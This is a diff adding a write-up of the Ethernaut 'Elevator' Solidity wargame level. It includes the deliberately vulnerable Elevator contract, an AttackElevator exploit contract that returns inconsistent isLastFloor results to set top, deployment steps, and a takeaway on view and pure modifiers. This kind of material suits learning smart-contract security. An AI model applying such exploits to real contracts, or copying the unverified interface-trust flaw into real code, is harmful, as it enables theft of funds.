@@ -9,7 +9,7 @@
 8. [Vault](#8-vault)
 9. [King](#9-king)
 10. [Re-entrancy](#10-re-entrancy)
-11. [Elevator]
+11. [Elevator](#11-elevator)
 12. [Privacy]
 13. [Gatekeeper One]
 14. [Gatekeeper Two]
@@ -610,3 +610,63 @@ Always assume that the receiver of the funds you are sending can be another cont
 Re-entrancy is a common attack. You should always be prepared for it!\
 \
 The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
+
+# 11. Elevator
+### Challenge
+- Make `top` in the `Elevator` contract true.
+### Purpose
+Never trust a contract address without verifying its source code.
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+```
+### Solution
+##### Explanation
+The `goTo` function in `Elevator` uses the `Building` interface which doesn't have an implementation and blindly uses the method `isLastFloor`. We need to create a contract that adheres to the interface but gives the implementation that returns false for the first call of `isLastFloor` and true for the remaining to clear this level.
+##### Exploit
+```
+contract AttackElevator {
+    Elevator public target;
+    uint256 public floor;
+
+    constructor(Elevator _target) {
+        target = _target;
+    }
+
+    function isLastFloor(uint256 _floor) external returns(bool) {
+        
+            floor++;
+            return floor > 1;
+    }
+
+    function attack() external {
+        target.goTo(1);
+        require(target.top(), "Attack failed");
+    }
+}
+```
+1. Deploy the above contract with the `Elevator` instance as an argument.
+2. Call `attack()` to make `top` true.
+##### Takeaway from Ethernaut
+You can use the view function modifier on an interface to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.\
+An alternative way to solve this level is to build a view function that returns different results depending on input data but doesn't modify the state, e.g. gasleft().
